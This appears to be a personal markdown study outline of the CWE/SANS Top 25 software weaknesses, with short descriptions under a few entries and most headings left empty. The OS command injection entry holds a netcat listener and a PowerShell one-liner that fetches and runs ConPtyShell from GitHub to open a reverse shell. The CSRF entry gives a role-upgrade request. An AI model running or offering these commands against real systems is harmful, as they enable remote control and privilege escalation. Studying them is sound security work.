# CWE/SANS TOP 25 Most Dangerous Software Errors

- [CWE - SANS 25](#cwesans-top-25-most-dangerous-software-errors)
  - [1 Improper Restriction of Operations within the Bounds of a Memory Buffer](#1cwe-119improper-restriction-of-operations-within-the-bounds-of-a-memory-buffer)
  - [2 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](#2cwe-79improper-neutralization-of-input-during-web-page-generation-cross-site-scripting)
  - [3 Improper Input Validation](#3cwe-20improper-input-validation)
  - [4 Information Exposure](#4cwe-200information-exposure)
  - [5 Out-of-bounds Read](#5cwe-125out-of-bounds-read)
  - [6 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](#6cwe-89improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection)
  - [7 Use After Free](#7cwe-416use-after-free)
  - [8 Integer Overflow or Wraparound](#8cwe-190integer-overflow-or-wraparound)
  - [9 Cross-Site Request Forgery (CSRF)](#9cwe-352cross-site-request-forgery-csrf)
  - [10 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](#10cwe-22improper-limitation-of-a-pathname-to-a-restricted-directory-path-traversa)
  - [11 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](#11cwe-78improper-neutralization-of-special-elements-used-in-an-os-command-os-command-injection)
  - [12 Out-of-bounds Write](#12cwe-787out-of-bounds-write)
  - [13 Improper Authentication](#13cwe-287improper-authentication)
  - [14 NULL Pointer Dereference](#14cwe-476null-pointer-dereference)
  - [15 Incorrect Permission Assignment for Critical Resource](#15cwe-732incorrect-permission-assignment-for-critical-resource)
  - [16 Unrestricted Upload of File with Dangerous Type](#16cwe-434unrestricted-upload-of-file-with-dangerous-type)
  - [17 Improper Restriction of XML External Entity Reference](#17cwe-611improper-restriction-of-xml-external-entity-reference)
  - [18 Improper Control of Generation of Code ('Code Injection')](#18cwe-94improper-control-of-generation-of-code-code-injection)
  - [19 Use of Hard-coded Credentials](#19cwe-798use-of-hard-coded-credentials)
  - [20 Uncontrolled Resource Consumption](#20cwe-400uncontrolled-resource-consumption)
  - [21 Missing Release of Resource after Effective Lifetime](#21cwe-772missing-release-of-resource-after-effective-lifetime)
  - [22 Untrusted Search Path](#22cwe-426untrusted-search-path)
  - [23 Deserialization of Untrusted Data](#23cwe-502deserialization-of-untrusted-data)
  - [24 Improper Privilege Management](#24cwe-269improper-privilege-management)
  - [25 Improper Certificate Validation](#25cwe-295improper-certificate-validation)

## 1	CWE-119	Improper Restriction of Operations within the Bounds of a Memory Buffer

## 2	CWE-79	Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
1) Type 1: Reflected XSS (or Non-Persistent)
2) Type 2: Stored XSS (or Persistent) 
3) Type 0: DOM-Based XSS
## 3	CWE-20	Improper Input Validation
Input validation can be applied to:
1) raw data - strings, numbers, parameters, file contents, etc.
2) metadata - information about the raw data, such as headers or size 

May need to be validated upon entry into the code, such as: 
* specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.
* implied or derived quantities, such as the actual size of a file instead of a specified size
* indexes, offsets, or positions into more complex data structures
* symbolic keys or other elements into hash tables, associative arrays, etc.
* well-formedness, i.e. syntactic correctness - compliance with expected syntax
* lexical token correctness - compliance with rules for what is treated as a token
* specified or derived type - the actual type of the input (or what the input appears to be)
* consistency - between individual data elements, between raw data and metadata, between references, etc.
* conformance to domain-specific rules, e.g. business logic
* equivalence - ensuring that equivalent inputs are treated the same
* authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data 
## 4	CWE-200	Information Exposure
Some kinds of sensitive information include:

* private, personal information, such as personal messages, financial data, health records, geographic location, or contact details
* system status and environment, such as the operating system and installed packages
* business secrets and intellectual property
* network status and configuration
* the product's own code or internal state
* metadata, e.g. logging of connections or message headers
* indirect information, such as a discrepancy between two internal operations that can be observed by an outsider 

Information exposures can occur in different ways:

* The code explicitly inserts sensitive information into resources or messages that are intentionally made accessible to unauthorized actors, but should not   contain the information - i.e., the information should have been "scrubbed" or "sanitized"
* A different weakness or mistake indirectly inserts the sensitive information into resources, such as a web script error revealing the full system path of the program.
* The code manages resources that intentionally contain sensitive information, but the resources are unintentionally made accessible to unauthorized actors. In this case, the information exposure is resultant - i.e., a different weakness enabled the access to the information in the first place. 

[Reference](#3---sensitive-data-exposure)
## 5	CWE-125	Out-of-bounds Read
## 6	CWE-89	Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands. 

## 7	CWE-416	Use After Free
## 8	CWE-190	Integer Overflow or Wraparound
## 9	CWE-352	Cross-Site Request Forgery (CSRF)

/admin-roles?username=carlos&action=upgrade GET Request with unatorazided access + no csrf.

## 10	CWE-22	Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
## 11	CWE-78	Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
Listen
stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 192.168.1.xxx

Send - Windows
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.xxx 87
## 12	CWE-787	Out-of-bounds Write
## 13	CWE-287	Improper Authentication
## 14	CWE-476	NULL Pointer Dereference
## 15	CWE-732	Incorrect Permission Assignment for Critical Resource
## 16	CWE-434	Unrestricted Upload of File with Dangerous Type
## 17	CWE-611	Improper Restriction of XML External Entity Reference
## 18	CWE-94	Improper Control of Generation of Code ('Code Injection')
## 19	CWE-798	Use of Hard-coded Credentials
## 20	CWE-400	Uncontrolled Resource Consumption
## 21	CWE-772	Missing Release of Resource after Effective Lifetime
## 22	CWE-426	Untrusted Search Path
## 23	CWE-502	Deserialization of Untrusted Data
## 24	CWE-269	Improper Privilege Management
## 25	CWE-295	Improper Certificate Validation
